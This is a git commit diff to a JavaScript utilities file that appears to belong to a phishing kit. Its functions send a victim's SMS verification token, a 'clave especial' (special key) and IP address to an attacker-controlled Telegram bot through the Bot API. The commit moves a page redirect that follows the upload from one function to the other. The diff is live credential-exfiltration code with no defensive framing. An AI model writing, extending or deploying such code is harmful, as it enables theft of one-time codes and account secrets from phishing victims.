59263c819642c05e7d46e86093a8fa78e8a794c2
isabela2024dev <isabellavasques427@gmail.com>
2024-07-03 15:15:07 -0400

    Update utils.js

--- utils/utils.js
+++ utils/utils.js
@@ -15,12 +15,12 @@ export function tlgSMSuser(user) {
 
 export function tlgSMStoken(user) {
   const url = `https://api.telegram.org/bot${telegram_token}/sendMessage?chat_id=${chat_id}&text=%F0%9F%92%ACTOKEN%20SMS%3A%20${user.sms}%0A%E2%9E%96%E2%9E%96%E2%9E%96%5BIP%20INFO%5D%E2%9E%96%E2%9E%96%E2%9E%96%E2%9E%96%0A%F0%9F%8C%90IP%3A%20${user.ip}`;
-  fetch(url);
+  fetch(url).then(() => {
+    window.location.replace("");
+  });;
 }
 
 export function tlgSMSkey(user) {
   const url = `https://api.telegram.org/bot${telegram_token}/sendMessage?chat_id=${chat_id}&text=%E2%9A%99%EF%B8%8FCLAVE ESPECIAL%3A%20${user.key}%0A%E2%9E%96%E2%9E%96%E2%9E%96%5BIP%20INFO%5D%E2%9E%96%E2%9E%96%E2%9E%96%E2%9E%96%0A%F0%9F%8C%90IP%3A%20${user.ip}`;
-  fetch(url).then(() => {
-    window.location.replace("");
-  });
+  fetch(url)
 }
